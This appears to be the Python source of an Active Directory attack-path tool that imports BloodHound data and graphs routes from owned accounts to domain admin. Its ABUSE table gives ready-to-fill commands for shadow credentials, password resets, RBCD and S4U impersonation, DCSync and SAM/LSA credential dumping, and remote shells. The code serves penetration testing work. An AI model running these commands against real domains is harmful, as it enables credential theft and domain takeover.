#!/usr/bin/env python3
import argparse
import json
import os
import posixpath
import re
import sqlite3
import sys
import threading
import time
import urllib.parse
import zipfile
from lib import multipart
from collections import defaultdict, deque
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer, BaseHTTPRequestHandler
from pathlib import Path

__version__ = "1.0.0"

ROOT = Path(__file__).resolve().parent
WEB = ROOT / "web"
DATA = ROOT / "data"
DB_PATH = DATA / "graph.db"

TYPEMAP = {
    "users": "User",
    "groups": "Group",
    "computers": "Computer",
    "domains": "Domain",
    "gpos": "GPO",
    "ous": "OU",
    "containers": "Container",
}
HIGH_VALUE_NAMES = (
    "DOMAIN ADMINS",
    "ENTERPRISE ADMINS",
    "ADMINISTRATORS",
    "DOMAIN CONTROLLERS",
    "SCHEMA ADMINS",
    "ACCOUNT OPERATORS",
    "BACKUP OPERATORS",
    "KEY ADMINS",
    "ENTERPRISE KEY ADMINS",
    "SERVER OPERATORS",
    "PRINT OPERATORS",
    "KRBTGT",
)
ABUSABLE = {
    "genericall",
    "genericwrite",
    "writedacl",
    "writeowner",
    "owns",
    "addkeycredentiallink",
    "forcechangepassword",
    "allextendedrights",
    "writespn",
    "addspn",
    "addmember",
    "addself",
    "allowedtoact",
    "allowedtodelegate",
    "dcsync",
    "getchanges",
    "getchangesall",
    "synclapspassword",
    "adminto",
    "readgmsapassword",
    "writeaccountrestrictions",
}
RIGHT_RANK = {
    "dcsync": 0,
    "getchangesall": 0,
    "getchanges": 1,
    "genericall": 2,
    "writedacl": 3,
    "writeowner": 4,
    "owns": 4,
    "addkeycredentiallink": 5,
    "forcechangepassword": 6,
    "allextendedrights": 7,
    "genericwrite": 8,
    "writespn": 9,
    "addspn": 9,
    "addmember": 10,
    "addself": 10,
    "allowedtoact": 11,
    "allowedtodelegate": 12,
    "synclapspassword": 13,
    "adminto": 14,
    "readgmsapassword": 6,
    "writeaccountrestrictions": 15,
}

ABUSE = {
    "genericall": [
        {"os": "linux", "tool": "certipy (Shadow Creds)", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
        {"os": "linux", "tool": "bloodyAD (Shadow Creds)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add shadowCredentials '{dst}'"},
        {"os": "linux", "tool": "pyWhisker (Shadow Creds)", "cmd": "pywhisker.py -d {domain} -u '{src}' -p '<pass>' --target '{dst}' --action add"},
        {"os": "linux", "tool": "bloodyAD (password reset)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set password '{dst}' 'Newp@ss123!'"},
        {"os": "linux", "tool": "targetedKerberoast (set SPN)", "cmd": "python3 targetedKerberoast.py -u '{src}' -p '<pass>' -d {domain} --dc-ip <dc-ip> --request-user '{dst}'"},
        {"os": "windows", "tool": "Whisker (Shadow Creds)", "cmd": "Whisker.exe add /target:{dst}"},
        {"os": "windows", "tool": "PowerView (reset)", "cmd": "Set-DomainUserPassword -Identity {dst} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
    ],
    "genericwrite": [
        {"os": "linux", "tool": "targetedKerberoast (WriteSPN)", "cmd": "python3 targetedKerberoast.py -u '{src}' -p '<pass>' -d {domain} --dc-ip <dc-ip> --request-user '{dst}'"},
        {"os": "linux", "tool": "certipy (Shadow Creds)", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
        {"os": "linux", "tool": "bloodyAD (Shadow Creds)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add shadowCredentials '{dst}'"},
        {"os": "linux", "tool": "bloodyAD (set SPN)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set object '{dst}' servicePrincipalName -v 'adapwn/x'"},
        {"os": "windows", "tool": "PowerView + Rubeus", "cmd": "Set-DomainObject -Identity {dst} -Set @{{serviceprincipalname='adapwn/http'}}; Rubeus.exe kerberoast /user:{dst} /nowrap"},
        {"os": "windows", "tool": "Whisker (Shadow Creds)", "cmd": "Whisker.exe add /target:{dst}"},
    ],
    "writedacl": [
        {"os": "linux", "tool": "impacket-dacledit", "cmd": "impacket-dacledit {domain}/'{src}':'<pass>' -action write -rights FullControl -principal '{src}' -target-dn '{dstdn}' -dc-ip <dc-ip> -use-ldaps"},
        {"os": "linux", "tool": "bloodyAD (grant GenericAll)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add genericAll '{dstdn}' '{src}'"},
        {"os": "linux", "tool": "bloodyAD (grant DCSync, domain head)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add dcsync '{src}'"},
        {"os": "windows", "tool": "PowerView", "cmd": "Add-DomainObjectAcl -TargetIdentity '{dst}' -PrincipalIdentity '{src}' -Rights All"},
    ],
    "writeowner": [
        {"os": "linux", "tool": "impacket (owner -> dacl)", "cmd": "impacket-owneredit {domain}/'{src}':'<pass>' -action write -new-owner '{src}' -target-dn '{dstdn}' -dc-ip <dc-ip> -use-ldaps  &&  impacket-dacledit {domain}/'{src}':'<pass>' -action write -rights FullControl -principal '{src}' -target-dn '{dstdn}' -dc-ip <dc-ip> -use-ldaps"},
        {"os": "linux", "tool": "bloodyAD (owner -> GenericAll)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set owner '{dstdn}' '{src}'  &&  bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add genericAll '{dstdn}' '{src}'"},
        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainObjectOwner -Identity '{dst}' -OwnerIdentity '{src}'; Add-DomainObjectAcl -TargetIdentity '{dst}' -PrincipalIdentity '{src}' -Rights All"},
    ],
    "addkeycredentiallink": [
        {"os": "linux", "tool": "certipy (Shadow Creds)", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
        {"os": "linux", "tool": "bloodyAD (Shadow Creds)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add shadowCredentials '{dst}'"},
        {"os": "linux", "tool": "pyWhisker + PKINIT", "cmd": "pywhisker.py -d {domain} -u '{src}' -p '<pass>' --target '{dst}' --action add   # then gettgtpkinit.py / getnthash.py"},
        {"os": "windows", "tool": "Whisker", "cmd": "Whisker.exe add /target:{dst}"},
    ],
    "forcechangepassword": [
        {"os": "linux", "tool": "bloodyAD", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set password '{dst}' 'Newp@ss123!'"},
        {"os": "linux", "tool": "net rpc", "cmd": "net rpc password '{dst}' 'Newp@ss123!' -U '{domain}/{src}%<pass>' -S <dc>"},
        {"os": "linux", "tool": "rpcclient", "cmd": "rpcclient -U '{domain}/{src}%<pass>' <dc> -c \"setuserinfo2 {dst} 23 Newp@ss123!\""},
        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainUserPassword -Identity {dst} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
    ],
    "addmember": [
        {"os": "linux", "tool": "bloodyAD", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add groupMember '{dstdn}' '{srcdn}'"},
        {"os": "linux", "tool": "net rpc", "cmd": "net rpc group addmem '{dst}' '{src}' -U '{domain}/{src}%<pass>' -S <dc>"},
        {"os": "windows", "tool": "PowerView", "cmd": "Add-DomainGroupMember -Identity '{dst}' -Members '{src}'"},
    ],
    # RBCD is ALREADY in place on this edge: {src} sits in {dst}'s
    # msDS-AllowedToActOnBehalfOfOtherIdentity, so {src} mints tickets to {dst} as
    # anybody. These are the no-context fallbacks — node_detail() replaces them with
    # the SPN-accurate chain once the object's properties are loaded.
    "allowedtoact": [
        {"os": "linux", "tool": "1 · getST (S4U2self + S4U2proxy)", "cmd": "impacket-getST -spn 'cifs/{dstfqdn}' -impersonate Administrator {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
        {"os": "linux", "tool": "2 · use the ticket", "cmd": "export KRB5CCNAME='Administrator@cifs_{dstfqdn}@{DOMAIN}.ccache'  &&  impacket-psexec -k -no-pass {dstfqdn}"},
        {"os": "windows", "tool": "Rubeus s4u", "cmd": "Rubeus.exe s4u /user:{src} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstfqdn} /ptt"},
    ],
    "allowedtodelegate": [
        {"os": "linux", "tool": "0 · confirm the delegation flavour", "cmd": "impacket-findDelegation {domain}/'{src}':'<pass>' -k -dc-ip <dc-ip>   # Constrained w/ or w/o Protocol Transition?"},
        {"os": "linux", "tool": "1 · getST (constrained S4U)", "cmd": "impacket-getST -spn 'cifs/{dstfqdn}' -impersonate Administrator {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
        {"os": "windows", "tool": "Rubeus s4u", "cmd": "Rubeus.exe s4u /user:{src} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstfqdn} /ptt"},
    ],
    # THE RBCD write primitive: this right lets you set msDS-AllowedToActOnBehalfOf-
    # OtherIdentity on {dst}, which is how you CREATE the AllowedToAct edge above.
    "writeaccountrestrictions": [
        {"os": "linux", "tool": "1 · write RBCD", "cmd": "impacket-rbcd {domain}/'{src}':'<pass>' -delegate-from '<principal-with-spn>' -delegate-to '{dst}' -action write -dc-ip <dc-ip> -use-ldaps"},
        {"os": "linux", "tool": "1 · write RBCD (bloodyAD)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add rbcd '{dst}' '<principal-with-spn>'"},
        {"os": "linux", "tool": "2 · S4U as the allowed principal", "cmd": "impacket-getST -spn 'cifs/{dstfqdn}' -impersonate Administrator {domain}/'<principal-with-spn>':'<pass>' -dc-ip <dc-ip>"},
        {"os": "linux", "tool": "3 · clean up", "cmd": "impacket-rbcd {domain}/'{src}':'<pass>' -delegate-to '{dst}' -action remove -dc-ip <dc-ip> -use-ldaps"},
        {"os": "windows", "tool": "PowerView (RBCD)", "cmd": "Set-DomainRBCD -Identity '{dst}' -DelegateFrom '<principal-with-spn>'"},
    ],
    "dcsync": [
        {"os": "linux", "tool": "impacket-secretsdump", "cmd": "impacket-secretsdump {domain}/'{src}':'<pass>'@<dc> -just-dc"},
        {"os": "linux", "tool": "netexec", "cmd": "nxc smb <dc> -d {domain} -u '{src}' -p '<pass>' --ntds"},
        {"os": "windows", "tool": "mimikatz", "cmd": "lsadump::dcsync /domain:{domain} /user:Administrator"},
    ],
    "adminto": [
        {"os": "linux", "tool": "evil-winrm", "cmd": "evil-winrm -i {dst} -u '{src}' -p '<pass>'"},
        {"os": "linux", "tool": "impacket-psexec", "cmd": "impacket-psexec {domain}/'{src}':'<pass>'@{dst}"},
        {"os": "linux", "tool": "impacket-wmiexec", "cmd": "impacket-wmiexec {domain}/'{src}':'<pass>'@{dst}"},
        {"os": "linux", "tool": "netexec (SAM/LSA)", "cmd": "nxc smb {dst} -d {domain} -u '{src}' -p '<pass>' --sam --lsa"},
        {"os": "windows", "tool": "PsExec", "cmd": "PsExec.exe \\\\{dst} cmd"},
    ],
    "readgmsapassword": [
        {"os": "linux", "tool": "netexec gMSA", "cmd": "nxc ldap <dc> -d {domain} -u '{src}' -p '<pass>' --gmsa"},
        {"os": "linux", "tool": "bloodyAD gMSA", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> get object '{dst}' --attr msDS-ManagedPassword"},
        {"os": "linux", "tool": "gMSADumper", "cmd": "python3 gMSADumper.py -u '{src}' -p '<pass>' -d {domain} -l <dc>"},
    ],
}
for alias, target in {
    "owns": "writeowner",
    "addself": "addmember",
    "getchanges": "dcsync",
    "getchangesall": "dcsync",
    "allextendedrights": "dcsync",
    "writespn": "genericwrite",
    "addspn": "genericwrite",
    "synclapspassword": "genericall",
}.items():
    ABUSE.setdefault(alias, ABUSE.get(target, []))


def key(right):
    return "".join(ch for ch in (right or "").lower() if ch.isalpha())


def short_name(label):
    return (label or "").split("@")[0].split(".")[0]


def edge_rank(edge, deg=None):
    deg = deg or {}
    return (
        RIGHT_RANK.get(key(edge["right_name"]), 80),
        -int(edge["abusable"]),
        -(deg.get(edge["source_sid"], 0) + deg.get(edge["target_sid"], 0)),
        edge["right_name"],
    )


def path_traversable(edge):
    # Traversable for attack paths: any abusable right, group membership, or OU/
    # Container containment. Containment lets a path flow from a container you
    # control down into the objects it holds — the D.Anderson -GenericAll-> OU
    # -Contains-> E.Rodriguez -AddSelf-> … chain the writeup follows.
    right = key(edge["right_name"])
    return bool(edge["abusable"]) or right in {"memberof", "contains"}


# The schema and the abusable-flag backfill are per-DATABASE work, not per-request.
# Doing them on every connection meant a full-table UPDATE on `edges` for every
# single HTTP hit — which, with ThreadingHTTPServer, is several writers racing for
# the write lock on every page load ("database is locked") and a write-ahead log
# that grows without bound.
_schema_lock = threading.Lock()
_schema_ready = False


def db():
    global _schema_ready
    DATA.mkdir(exist_ok=True)
    con = sqlite3.connect(DB_PATH, timeout=30)
    con.row_factory = sqlite3.Row
    con.execute("PRAGMA journal_mode=WAL")
    # Wait for a busy writer instead of failing the request outright.
    con.execute("PRAGMA busy_timeout=30000")
    con.execute("PRAGMA foreign_keys=ON")
    with _schema_lock:
        if _schema_ready:
            return con
        _prepare_schema(con)
        _schema_ready = True
    return con


def _prepare_schema(con):
    con.executescript(
        """
        CREATE TABLE IF NOT EXISTS domains (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          name TEXT NOT NULL,
          source TEXT,
          created_at INTEGER NOT NULL,
          node_count INTEGER NOT NULL DEFAULT 0,
          edge_count INTEGER NOT NULL DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS nodes (
          domain_id INTEGER NOT NULL,
          sid TEXT NOT NULL,
          label TEXT NOT NULL,
          type TEXT NOT NULL,
          high_value INTEGER NOT NULL DEFAULT 0,
          owned INTEGER NOT NULL DEFAULT 0,
          props TEXT NOT NULL DEFAULT '{}',
          PRIMARY KEY(domain_id, sid),
          FOREIGN KEY(domain_id) REFERENCES domains(id) ON DELETE CASCADE
        );
        CREATE TABLE IF NOT EXISTS edges (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          domain_id INTEGER NOT NULL,
          source_sid TEXT NOT NULL,
          target_sid TEXT NOT NULL,
          right_name TEXT NOT NULL,
          abusable INTEGER NOT NULL DEFAULT 0,
          props TEXT NOT NULL DEFAULT '{}',
          UNIQUE(domain_id, source_sid, target_sid, right_name),
          FOREIGN KEY(domain_id) REFERENCES domains(id) ON DELETE CASCADE
        );
        CREATE INDEX IF NOT EXISTS idx_nodes_domain_type ON nodes(domain_id, type);
        CREATE INDEX IF NOT EXISTS idx_nodes_label ON nodes(domain_id, label);
        CREATE INDEX IF NOT EXISTS idx_edges_domain_src ON edges(domain_id, source_sid);
        CREATE INDEX IF NOT EXISTS idx_edges_domain_dst ON edges(domain_id, target_sid);
        """
    )
    # Backfill for graphs imported before a right joined ABUSABLE. `abusable=0`
    # keeps it a no-op once it has run, so it costs nothing on an up-to-date DB.
    known = tuple(ABUSABLE)
    if known:
        placeholders = ",".join("?" for _ in known)
        con.execute(
            f"UPDATE edges SET abusable=1 "
            f"WHERE abusable=0 AND lower(replace(right_name, ' ', '')) IN ({placeholders})",
            known,
        )
        con.commit()


def load_zip(path):
    files = {}
    with zipfile.ZipFile(path) as zf:
        for name in zf.namelist():
            if not name.lower().endswith(".json"):
                continue
            try:
                with zf.open(name) as fh:
                    files[name] = json.load(fh)
            except Exception:
                continue
    return files


def records(files):
    for _, doc in files.items():
        data = doc.get("data") if isinstance(doc, dict) else doc
        meta = doc.get("meta", {}) if isinstance(doc, dict) else {}
        dtype = (meta or {}).get("type", "")
        if isinstance(data, list):
            for row in data:
                yield dtype, row


def infer_domain(files):
    for dtype, row in records(files):
        if dtype != "domains":
            continue
        props = row.get("Properties") or {}
        name = props.get("name")
        if name:
            return name
    return "unknown.local"


def parse_bloodhound(path, domain_name=None):
    files = load_zip(path)
    domain_name = domain_name or infer_domain(files)
    nodes = {}
    edges = []

    def add_node(sid, label, ntype, high_value=False, props=None):
        if not sid:
            return
        current = nodes.get(sid)
        if current is None:
            nodes[sid] = {
                "sid": sid,
                "label": label or sid,
                "type": ntype or "Base",
                "high_value": bool(high_value),
                "owned": False,
                "props": props or {},
            }
            return
        if label and current["label"] == current["sid"]:
            current["label"] = label
        if ntype and current["type"] == "Base":
            current["type"] = ntype
        current["high_value"] = current["high_value"] or bool(high_value)
        if props:
            current["props"].update(props)

    def ensure(sid, ntype="Base"):
        if sid and sid not in nodes:
            add_node(sid, sid, ntype or "Base")

    for dtype, row in records(files):
        ntype = TYPEMAP.get(dtype, "Base")
        sid = row.get("ObjectIdentifier")
        props = row.get("Properties") or {}
        label = props.get("name") or props.get("distinguishedname") or sid
        high_value = bool(props.get("highvalue", False))
        if ntype == "Group" and any(part in (label or "").upper() for part in HIGH_VALUE_NAMES):
            high_value = True
        if ntype == "Domain":
            high_value = True
        add_node(sid, label, ntype, high_value, props)

    for dtype, row in records(files):
        sid = row.get("ObjectIdentifier")
        if not sid:
            continue
        for ace in row.get("Aces") or []:
            psid = ace.get("PrincipalSID")
            right = ace.get("RightName") or "ACE"
            if psid:
                ensure(psid, ace.get("PrincipalType", "Base"))
                edges.append((psid, sid, right, ace))
        for member in row.get("Members") or []:
            msid = member.get("ObjectIdentifier")
            if msid:
                ensure(msid, member.get("ObjectType", "Base"))
                edges.append((msid, sid, "MemberOf", member))
        # OU/Container/Domain containment: control over a container carries down to
        # the objects it holds (the writeup's D.Anderson -GenericAll-> Marketing OU
        # -Contains-> E.Rodriguez opening). Direction: container -> child.
        for child in row.get("ChildObjects") or []:
            cid = child.get("ObjectIdentifier") if isinstance(child, dict) else child
            if cid:
                ensure(cid, child.get("ObjectType", "Base") if isinstance(child, dict) else "Base")
                edges.append((sid, cid, "Contains", child if isinstance(child, dict) else {}))
        for item in row.get("AllowedToAct") or []:
            aid = item.get("ObjectIdentifier") if isinstance(item, dict) else item
            if aid:
                ensure(aid)
                edges.append((aid, sid, "AllowedToAct", {}))
        local_admins = row.get("LocalAdmins") or {}
        results = local_admins.get("Results") if isinstance(local_admins, dict) else local_admins
        for item in results or []:
            aid = item.get("ObjectIdentifier") if isinstance(item, dict) else item
            if aid:
                ensure(aid)
                edges.append((aid, sid, "AdminTo", {}))
        for item in row.get("AllowedToDelegate") or []:
            aid = item.get("ObjectIdentifier") if isinstance(item, dict) else item
            if aid:
                ensure(aid)
                edges.append((sid, aid, "AllowedToDelegate", {}))
    return domain_name, list(nodes.values()), edges


def mark_owned(nodes, owned):
    """Flag nodes as owned from a list of principal names/SIDs (e.g. from
    ADAutoPwn's compromised-principals file). Matches case-insensitively on
    sAMAccountName, the label's local part (before @), a computer's DNS first
    label, or the raw SID — with and without a trailing '$' for machine accounts."""
    if not owned:
        return 0
    want = set()
    for raw in owned:
        n = (raw or "").strip().lower()
        if not n:
            continue
        if "\\" in n:
            n = n.split("\\", 1)[1]
        if "@" in n:
            n = n.split("@", 1)[0]
        want.add(n)
        want.add(n.rstrip("$"))
    count = 0
    for node in nodes:
        cands = set()
        sam = (node.get("props") or {}).get("samaccountname")
        if sam:
            cands.add(sam.lower())
            cands.add(sam.lower().rstrip("$"))
        lbl = (node.get("label") or "").lower()
        if "@" in lbl:
            lbl = lbl.split("@", 1)[0]
        cands.add(lbl)
        cands.add(lbl.rstrip("$"))
        cands.add(lbl.split(".", 1)[0])      # computer DNS first component
        cands.add((node.get("sid") or "").lower())
        cands.discard("")
        if cands & want:
            node["owned"] = True
            count += 1
    return count


def import_zip(path, requested_name=None, source=None, owned=None):
    # Prefer the domain name embedded in the BloodHound data (canonical, e.g.
    # CORP.LOCAL) — like the original. A caller-supplied name is only a fallback
    # for when inference fails, so re-imports always normalise to the same name.
    domain_name, nodes, edges = parse_bloodhound(path, None)
    if (not domain_name or domain_name.lower() == "unknown.local") and requested_name:
        domain_name = requested_name
    if owned:
        mark_owned(nodes, owned)
    con = db()
    with con:
        # Re-importing the same domain REPLACES it instead of stacking duplicates
        # (case-insensitive match; nodes/edges cascade-delete via the FK).
        dup = con.execute("SELECT id FROM domains WHERE name=? COLLATE NOCASE", (domain_name,)).fetchone()
        if dup:
            con.execute("DELETE FROM domains WHERE id=?", (dup["id"],))
        cur = con.execute(
            "INSERT INTO domains(name, source, created_at, node_count, edge_count) VALUES(?,?,?,?,?)",
            (domain_name, source or os.path.basename(path), int(time.time()), len(nodes), len(edges)),
        )
        domain_id = cur.lastrowid
        con.executemany(
            """
            INSERT INTO nodes(domain_id, sid, label, type, high_value, owned, props)
            VALUES(?,?,?,?,?,?,?)
            """,
            [
                (
                    domain_id,
                    n["sid"],
                    n["label"],
                    n["type"],
                    int(n["high_value"]),
                    int(n["owned"]),
                    json.dumps(n["props"], separators=(",", ":")),
                )
                for n in nodes
            ],
        )
        con.executemany(
            """
            INSERT OR IGNORE INTO edges(domain_id, source_sid, target_sid, right_name, abusable, props)
            VALUES(?,?,?,?,?,?)
            """,
            [
                (
                    domain_id,
                    s,
                    t,
                    right,
                    int(key(right) in ABUSABLE),
                    json.dumps(props or {}, separators=(",", ":")),
                )
                for s, t, right, props in edges
            ],
        )
        edge_count = con.execute("SELECT COUNT(*) FROM edges WHERE domain_id=?", (domain_id,)).fetchone()[0]
        con.execute("UPDATE domains SET edge_count=? WHERE id=?", (edge_count, domain_id))
    con.close()
    return domain_id


def graph_payload(domain_id, view="overview", q="", focus="", rel="abusable", limit=650):
    con = db()
    node_rows = con.execute("SELECT * FROM nodes WHERE domain_id=?", (domain_id,)).fetchall()
    edge_rows = con.execute("SELECT * FROM edges WHERE domain_id=?", (domain_id,)).fetchall()
    # Constrained delegation without protocol transition cannot be used as it
    # stands: the route runs through an RBCD hop that does not exist yet and that
    # YOU create. It is not collected data, so it is flagged `planned` and drawn
    # dashed — but leaving it off the canvas hides the only way the chain works.
    planned = []
    if rel == "chain" and focus:
        frow = next((r for r in node_rows if r["sid"] == focus), None)
        fprops = props_of(frow, "props") if frow else {}
        if fprops.get("allowedtodelegate") and not fprops.get("trustedtoauth"):
            bridge = pick_helper(delegation_context(con, domain_id), focus)
            if bridge:
                planned.append({
                    "source_sid": bridge["sid"],
                    "target_sid": focus,
                    "right": "RBCD (you write this)",
                })
    con.close()

    by_sid = {row["sid"]: row for row in node_rows}
    deg = defaultdict(int)
    out = defaultdict(list)
    inc = defaultdict(list)
    for edge in edge_rows:
        deg[edge["source_sid"]] += 1
        deg[edge["target_sid"]] += 1
        out[edge["source_sid"]].append(edge)
        inc[edge["target_sid"]].append(edge)
    ranked_edges = sorted(edge_rows, key=lambda e: edge_rank(e, deg))

    def add_shortest_attack_paths():
        starts = [row["sid"] for row in node_rows if row["owned"]]
        targets = {row["sid"] for row in node_rows if row["high_value"]}
        if not starts or not targets:
            return
        adj = defaultdict(list)
        for edge in edge_rows:
            if path_traversable(edge):
                adj[edge["source_sid"]].append(edge)
        def emit_path(prev, prev_edge, end):
            cur = end
            visible.add(cur)
            while prev.get(cur) is not None:
                edge = prev_edge[cur]
                edge_scope.add(edge["id"])
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                cur = prev[cur]

        for start in starts[:20]:
            prev = {start: None}
            prev_edge = {}
            depth = {start: 0}
            qpath = deque([start])
            hit = None
            while qpath and hit is None:
                cur = qpath.popleft()
                if cur in targets and cur != start:
                    hit = cur
                    break
                if depth[cur] >= 7:
                    continue
                for edge in sorted(adj.get(cur, []), key=lambda e: edge_rank(e, deg))[:80]:
                    nxt = edge["target_sid"]
                    if nxt not in prev:
                        prev[nxt] = cur
                        prev_edge[nxt] = edge
                        depth[nxt] = depth[cur] + 1
                        qpath.append(nxt)
            if hit is not None:
                emit_path(prev, prev_edge, hit)
                continue
            # No DA/HV route: still show the best reachable attack chain so the
            # operator sees useful pivots instead of an empty canvas.
            candidates = [
                sid for sid in prev
                if sid != start and prev.get(sid) is not None
            ]
            candidates.sort(
                key=lambda sid: (
                    0 if (by_sid.get(sid)["high_value"] if by_sid.get(sid) else 0) else 1,
                    -depth.get(sid, 0),
                    -deg.get(sid, 0),
                    by_sid.get(sid)["label"] if by_sid.get(sid) else sid,
                )
            )
            for sid in candidates[:3]:
                emit_path(prev, prev_edge, sid)

    visible = set()
    edge_scope = set()
    depths = {}
    q = (q or "").lower().strip()
    focus = focus or ""
    rel = rel or "abusable"
    if focus and focus in by_sid and rel == "chain":
        # "Chain" = the whole onward attack path, not just the first hop. BFS out
        # over traversable edges so selecting DELEGATOR$ also pulls in what its
        # AllowedToDelegate edge unlocks, and what THAT unlocks — the way you
        # expand a path in BloodHound instead of re-clicking node after node.
        MAX_DEPTH, MAX_NODES, FANOUT = 5, 140, 12
        visible.add(focus)
        depths[focus] = 0
        queue = deque([focus])
        while queue:
            cur = queue.popleft()
            if depths[cur] >= MAX_DEPTH:
                continue
            # Reaching the domain object IS the end of the chain. Expanding past it
            # walks every Contains edge and dumps the whole directory on the canvas,
            # which is the noise this mode exists to avoid.
            if cur != focus and by_sid[cur]["type"] == "Domain":
                continue
            taken = 0
            for edge in sorted(out[cur], key=lambda e: edge_rank(e, deg)):
                if taken >= FANOUT:
                    break
                if not path_traversable(edge):
                    continue
                # Containment only earns its place one hop from a container you
                # actually control; a hub's child list is not an attack step.
                if key(edge["right_name"]) == "contains" and by_sid[cur]["type"] not in CONTAINER_TYPES:
                    continue
                taken += 1
                nxt = edge["target_sid"]
                if nxt not in depths and len(depths) >= MAX_NODES:
                    continue
                edge_scope.add(edge["id"])
                visible.add(edge["source_sid"])
                visible.add(nxt)
                if nxt not in depths:
                    depths[nxt] = depths[cur] + 1
                    queue.append(nxt)
        for pe in planned:
            visible.add(pe["source_sid"])
            depths.setdefault(pe["source_sid"], -1)
        # Keep the inbound takeover context for the focused object itself: how you
        # got here matters as much as where it goes.
        for edge in inc[focus]:
            if edge["abusable"]:
                edge_scope.add(edge["id"])
                visible.add(edge["source_sid"])
                depths.setdefault(edge["source_sid"], -1)
    elif focus and focus in by_sid:
        visible.add(focus)
        # "Abusable" focus = exploitable edges, and containment (controlling an
        # OU/Container IS how you reach the objects it holds), so the exploit
        # relationship is never hidden just because Contains isn't a right.
        def _abusable_focus(edge):
            return bool(edge["abusable"]) or key(edge["right_name"]) == "contains"
        if rel in ("outbound", "all", "abusable"):
            for edge in out[focus]:
                if rel == "abusable" and not _abusable_focus(edge):
                    continue
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
        if rel in ("inbound", "all", "abusable"):
            for edge in inc[focus]:
                if rel == "abusable" and not _abusable_focus(edge):
                    continue
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
    elif q:
        for row in node_rows:
            if q in row["label"].lower() or q in row["sid"].lower():
                visible.add(row["sid"])
        for sid in list(visible):
            for edge in out[sid]:
                if edge["abusable"]:
                    visible.add(edge["target_sid"])
                    edge_scope.add(edge["id"])
            for edge in inc[sid]:
                if edge["abusable"]:
                    visible.add(edge["source_sid"])
                    edge_scope.add(edge["id"])
    elif view == "all":
        visible = {row["sid"] for row in sorted(node_rows, key=lambda r: deg[r["sid"]], reverse=True)[:limit]}
    elif view == "owned":
        visible = {row["sid"] for row in node_rows if row["owned"]}
        for sid in list(visible):
            for edge in out[sid] + inc[sid]:
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
    elif view == "highvalue":
        visible = {row["sid"] for row in node_rows if row["high_value"]}
        for sid in list(visible):
            for edge in inc[sid]:
                if edge["abusable"]:
                    visible.add(edge["source_sid"])
                    edge_scope.add(edge["id"])
    elif view == "paths":
        add_shortest_attack_paths()
    elif view == "acl":
        max_edges = min(180, max(80, limit // 3))
        for edge in ranked_edges:
            if edge["abusable"]:
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
                if len(edge_scope) >= max_edges or len(visible) >= limit:
                    break
    else:
        max_edges = min(140, max(70, limit // 4))
        for edge in ranked_edges:
            if edge["abusable"]:
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
                if len(edge_scope) >= max_edges:
                    break
        if len(visible) < 30:
            for row in node_rows:
                if row["high_value"] or row["owned"]:
                    visible.add(row["sid"])
    expanded = set(visible)
    if not focus and view in ("all",):
        for sid in list(visible):
            for edge in out[sid][:10] + inc[sid][:10]:
                expanded.add(edge["source_sid"])
                expanded.add(edge["target_sid"])
                edge_scope.add(edge["id"])
    if len(expanded) > limit:
        keep = {sid for sid in expanded if by_sid[sid]["high_value"] or by_sid[sid]["owned"]}
        for sid in sorted(expanded - keep, key=lambda s: deg[s], reverse=True):
            keep.add(sid)
            if len(keep) >= limit:
                break
        expanded = keep

    idx = {}
    nodes = []
    for sid in sorted(expanded, key=lambda s: (by_sid[s]["type"], -deg[s], by_sid[s]["label"])):
        row = by_sid[sid]
        idx[sid] = len(nodes)
        nodes.append(
            {
                "id": sid,
                "label": row["label"],
                "type": row["type"],
                "highValue": bool(row["high_value"]),
                "owned": bool(row["owned"]),
                "degree": deg[sid],
                "depth": depths.get(sid),
            }
        )
    edges = []
    for edge in edge_rows:
        if edge_scope and edge["id"] not in edge_scope:
            continue
        if edge["source_sid"] in idx and edge["target_sid"] in idx:
            edges.append(
                {
                    "id": edge["id"],
                    "source": idx[edge["source_sid"]],
                    "target": idx[edge["target_sid"]],
                    "sourceSid": edge["source_sid"],
                    "targetSid": edge["target_sid"],
                    "right": edge["right_name"],
                    "abusable": bool(edge["abusable"]),
                }
            )
    for pe in planned:
